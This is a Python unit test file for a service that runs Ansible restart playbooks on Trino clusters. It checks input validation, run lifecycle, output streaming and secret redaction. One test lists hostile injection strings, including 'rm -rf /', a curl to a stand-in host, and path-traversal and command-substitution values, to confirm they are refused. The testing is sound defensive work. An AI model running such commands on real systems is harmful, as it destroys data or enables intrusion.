"""Tests for Ansible-backed restart execution.

The platform team chose (2026-08-08) to have TMS run `ansible-playbook` from
the TMS host, which means the TMS host holds SSH access to every Trino node.
These tests are mostly about the blast radius of that decision: nothing a
request carries may influence what gets run or where.
"""

import os
import sys
import tempfile
import threading
import time
import unittest

sys.path.insert(
    0,
    os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "src"),
)

from tms.ops.ansible import (  # noqa: E402
    UNKNOWN,
    AnsibleError,
    AnsibleRestartExecutor,
    ansible_environment,
    redact,
)
from tms.ops.executor import FAILED, RUNNING, SUCCEEDED  # noqa: E402

INVENTORIES = {"prod-a": "/etc/tms/ansible/cluster1.ini",
               "prod-b": "/etc/tms/ansible/cluster2.ini"}


class FakeRunner:
    """Stands in for `ansible-playbook`.

    `lines` are handed to `on_line` one at a time, the way the real runner
    streams them; `output` is the older whole-blob form, kept because a runner
    that cannot stream must still work.
    """

    def __init__(self, rc=0, timed_out=False, output="", error=None, lines=None):
        self.result = {"rc": rc, "output": output}
        if timed_out:
            self.result = {"rc": None, "timed_out": True, "output": ""}
        if error:
            self.result = {"rc": None, "error": error, "output": ""}
        self.lines = list(lines or [])
        self.commands = []

    def __call__(self, command, timeout, on_line):
        self.commands.append(list(command))
        for line in self.lines:
            on_line(line)
        return dict(self.result)


def executor(runner=None, **kwargs):
    return AnsibleRestartExecutor(
        playbook="/etc/tms/ansible/restart.yml", cluster_inventories=INVENTORIES,
        runner=runner or FakeRunner(), **kwargs)


def _real_executor():
    """An executor wired to the real subprocess runner.

    `state_dir` is a temp directory rather than the default `/var/lib/trino-management-service`,
    which does not exist on a developer machine - and the executor now refuses
    to build without a writable one, because Ansible refuses to run without it.
    """
    return AnsibleRestartExecutor(
        playbook=__file__,                       # exists; never executed
        cluster_inventories={"prod-a": __file__},
        binary=sys.executable,
        state_dir=tempfile.mkdtemp(prefix="tms-ansible-test-"))


def wait(ex, sequence_id):
    run = ex._runs[sequence_id]
    run["thread"].join(timeout=5)
    return ex.status("prod-a", sequence_id)


class ConfigurationTest(unittest.TestCase):
    def test_playbook_must_be_absolute(self):
        with self.assertRaises(AnsibleError):
            AnsibleRestartExecutor(playbook="restart.yml", cluster_inventories=INVENTORIES,
                                   runner=FakeRunner())

    def test_playbook_is_configuration_not_input(self):
        """There is no argument anywhere that selects a playbook."""
        ex = executor()
        command = ex.build_command("prod-a")
        self.assertEqual("/etc/tms/ansible/restart.yml", command[-1])


class TargetingTest(unittest.TestCase):
    """Nothing a request carries may reach the command line."""

    def test_unknown_cluster_is_refused(self):
        with self.assertRaises(AnsibleError) as caught:
            executor().build_command("not-a-cluster")
        self.assertIn("no configured inventory", str(caught.exception))

    def test_the_cluster_name_never_reaches_the_command_line(self):
        """The name only picks an inventory file; the target comes from there."""
        command = executor().build_command("prod-a")
        self.assertIn("/etc/tms/ansible/cluster1.ini", command)
        self.assertNotIn("prod-a", command)

    def test_injection_attempts_are_refused_before_anything_runs(self):
        hostile = [
            "prod-a; rm -rf /",
            "prod-a && curl evil.invalid",
            "../../etc/passwd",
            "prod-a\nprod-b",
            "$(whoami)",
            "`id`",
            "*",
        ]
        runner = FakeRunner()
        ex = executor(runner)
        for name in hostile:
            with self.assertRaises(AnsibleError, msg=name):
                ex.build_command(name)
        self.assertEqual([], runner.commands, "nothing was executed")

    def test_a_relative_inventory_path_is_refused(self):
        """Defence in depth: bad configuration must not become a command."""
        with self.assertRaises(AnsibleError):
            AnsibleRestartExecutor(playbook="/etc/tms/p.yml",
                                   cluster_inventories={"prod-a": "cluster1.ini"},
                                   runner=FakeRunner())

    def test_each_cluster_gets_its_own_inventory(self):
        ex = executor()
        self.assertIn("/etc/tms/ansible/cluster2.ini", ex.build_command("prod-b"))

    def test_command_is_a_list_so_there_is_no_shell_to_escape(self):
        command = executor().build_command("prod-a")
        self.assertIsInstance(command, list)
        self.assertTrue(all(isinstance(part, str) for part in command))


class LifecycleTest(unittest.TestCase):
    def test_success(self):
        ex = executor(FakeRunner(rc=0))
        self.assertEqual(RUNNING, ex.start("prod-a", "seq-1"))
        self.assertEqual(SUCCEEDED, wait(ex, "seq-1"))

    def test_non_zero_exit_is_a_failure(self):
        ex = executor(FakeRunner(rc=2))
        ex.start("prod-a", "seq-1")
        self.assertEqual(FAILED, wait(ex, "seq-1"))
        self.assertIn("exited 2", ex.result("seq-1")["error"])

    def test_a_hanging_playbook_fails_rather_than_stranding_the_cluster(self):
        ex = executor(FakeRunner(timed_out=True), timeout_seconds=1)
        ex.start("prod-a", "seq-1")
        self.assertEqual(FAILED, wait(ex, "seq-1"))
        self.assertIn("did not finish", ex.result("seq-1")["error"])

    def test_missing_binary_is_a_failure_not_a_crash(self):
        ex = executor(FakeRunner(error="No such file or directory"))
        ex.start("prod-a", "seq-1")
        self.assertEqual(FAILED, wait(ex, "seq-1"))

    def test_starting_twice_does_not_run_twice(self):
        """The sequence may be resumed; a second restart would be an incident."""
        runner = FakeRunner(rc=0)
        ex = executor(runner)
        ex.start("prod-a", "seq-1")
        wait(ex, "seq-1")
        ex.start("prod-a", "seq-1")
        self.assertEqual(1, len(runner.commands))

    def test_unseen_sequence_is_unknown_not_success(self):
        """After a TMS restart the run is not observable. Guessing success here
        would restore traffic to a cluster that may not be back."""
        self.assertEqual(UNKNOWN, executor().status("prod-a", "never-started"))


class StreamingTest(unittest.TestCase):
    """Output has to appear while the playbook runs, not after it finishes.

    A restart playbook runs for minutes. A panel that stays blank until the
    work is over cannot tell the operator apart "connecting to the first host"
    from "hung", which is precisely when they need to know.
    """

    def test_lines_are_available_before_the_run_finishes(self):
        seen = []
        gate = threading.Event()

        def slow_runner(command, timeout, on_line):
            on_line("PLAY [restart trino] ***")
            on_line("TASK [drain worker 1] ***")
            seen.append(True)
            gate.wait(5)          # still running
            on_line("PLAY RECAP ***")
            return {"rc": 0}

        ex = executor(slow_runner)
        ex.start("prod-a", "seq-1")
        for _ in range(500):      # wait for the runner to emit its first lines
            if seen:
                break
            time.sleep(0.005)

        mid_run = ex.lines_since("seq-1")
        self.assertEqual(RUNNING, ex.status("prod-a", "seq-1"))
        self.assertIn("TASK [drain worker 1] ***", mid_run)
        self.assertNotIn("PLAY RECAP ***", mid_run,
                         "the run has not got there yet")

        gate.set()
        self.assertEqual(SUCCEEDED, wait(ex, "seq-1"))
        self.assertIn("PLAY RECAP ***", ex.lines_since("seq-1"))

    def test_lines_since_returns_only_what_is_new(self):
        ex = executor(FakeRunner(rc=0, lines=["one", "two", "three"]))
        ex.start("prod-a", "seq-1")
        wait(ex, "seq-1")
        self.assertEqual(["three"], ex.lines_since("seq-1", 2))
        self.assertEqual([], ex.lines_since("seq-1", 3))

    def test_a_runner_that_cannot_stream_still_works(self):
        ex = executor(FakeRunner(rc=0, output="PLAY RECAP\nok=5"))
        ex.start("prod-a", "seq-1")
        wait(ex, "seq-1")
        self.assertEqual(["PLAY RECAP", "ok=5"], ex.lines_since("seq-1"))

    def test_secrets_in_streamed_output_are_masked(self):
        """Redaction has to happen per line now, not over one final blob."""
        script = ("import sys\n"
                  "print('vault_password: hunter2')\n"
                  "print('PLAY RECAP')\n")
        ex = _real_executor()
        # Drive the real subprocess runner directly.
        lines = []
        result = ex._run_subprocess([sys.executable, "-c", script], 10, lines.append)
        self.assertEqual(0, result["rc"])
        self.assertNotIn("hunter2", "\n".join(lines))
        self.assertIn("PLAY RECAP", lines)

    def test_a_real_process_streams_line_by_line(self):
        """Proves the Popen path, not just the fake, produces output early."""
        script = ("import sys, time\n"
                  "print('first', flush=True)\n"
                  "time.sleep(0.4)\n"
                  "print('second', flush=True)\n")
        ex = _real_executor()
        stamps = []
        ex._run_subprocess([sys.executable, "-c", script], 10,
                           lambda line: stamps.append((time.monotonic(), line)))
        self.assertEqual(["first", "second"], [line for _, line in stamps])
        self.assertGreater(stamps[1][0] - stamps[0][0], 0.2,
                           "the second line arrived with the first - not streaming")

    def test_a_hanging_process_is_killed_rather_than_waited_on(self):
        ex = _real_executor()
        started = time.monotonic()
        result = ex._run_subprocess(
            [sys.executable, "-c", "import time; time.sleep(30)"], 0.5, lambda _: None)
        self.assertTrue(result.get("timed_out"))
        self.assertLess(time.monotonic() - started, 10,
                        "the watchdog did not interrupt the read loop")


class EnvironmentTest(unittest.TestCase):
    """Ansible needs a writable HOME and the service does not have one.

    Measured on ansible-core 2.21: with an unwritable HOME it aborts during
    `import ansible.constants`, exit code 5, "Unable to create local
    directories '~/.ansible/tmp'" - before argument parsing, so no playbook
    ever runs. The tms-api unit sets ProtectHome=true, which produces exactly
    that, so TMS pins HOME to its own state directory.
    """

    def test_home_is_pinned_to_the_state_directory(self):
        env = ansible_environment("/var/lib/trino-management-service")
        self.assertEqual("/var/lib/trino-management-service", env["HOME"])
        self.assertEqual("/var/lib/trino-management-service/.ansible", env["ANSIBLE_HOME"])
        self.assertEqual("/var/lib/trino-management-service/.ansible/tmp", env["ANSIBLE_LOCAL_TEMP"])

    def test_the_rest_of_the_environment_is_inherited(self):
        """A wholly clean environment would drop what SSH and Ansible need to
        find themselves - PATH above all."""
        env = ansible_environment("/var/lib/trino-management-service")
        self.assertIn("PATH", env)
        self.assertEqual(os.environ["PATH"], env["PATH"])

    def test_an_unwritable_state_dir_is_refused_at_construction(self):
        """A startup error, not a failure discovered with a cluster already
        drained and out of rotation."""
        with self.assertRaises(AnsibleError) as caught:
            AnsibleRestartExecutor(
                playbook=__file__, cluster_inventories={"prod-a": __file__},
                binary=sys.executable, state_dir="/nonexistent/tms-state")
        self.assertIn("StateDirectory=trino-management-service", str(caught.exception))

    def test_a_missing_binary_is_refused_at_construction(self):
        """Ansible commonly lives on a separate control node. Finding that out
        mid-restart is the worst possible moment."""
        with self.assertRaises(AnsibleError) as caught:
            AnsibleRestartExecutor(
                playbook=__file__, cluster_inventories={"prod-a": __file__},
                binary="/nonexistent/ansible-playbook",
                state_dir=tempfile.mkdtemp(prefix="tms-state-"))
        self.assertIn("installed on the TMS server", str(caught.exception))


class RedactionTest(unittest.TestCase):
    def test_obvious_secrets_are_masked(self):
        masked = redact("ok\npassword: hunter2\napi_key=abcd1234\n")
        self.assertNotIn("hunter2", masked)
        self.assertNotIn("abcd1234", masked)
        self.assertIn("password", masked)

    def test_ansibles_own_secret_variables_are_masked(self):
        """These are the names that actually appear, and a `\\bpassword\\b`
        anchor missed every one of them - there is no word boundary inside
        `vault_password`."""
        for name in ("vault_password", "ansible_password", "ansible_ssh_pass",
                     "become_password", "AWS_SECRET_ACCESS_KEY"):
            masked = redact("{}: hunter2".format(name))
            self.assertNotIn("hunter2", masked, name)
            self.assertIn(name, masked, "the variable name stays readable")

    def test_ordinary_output_survives(self):
        text = "PLAY RECAP\ntrino-a-coord : ok=5 changed=1 failed=0"
        self.assertEqual(text, redact(text))

    def test_a_recap_that_merely_contains_pass_is_not_redacted(self):
        """Over-matching hides lines the operator needs. `passed` is not a
        secret, and a redacted PLAY RECAP is a useless one."""
        text = "trino-a-coord : passed=12 failed=0"
        self.assertEqual(text, redact(text))


if __name__ == "__main__":
    unittest.main()
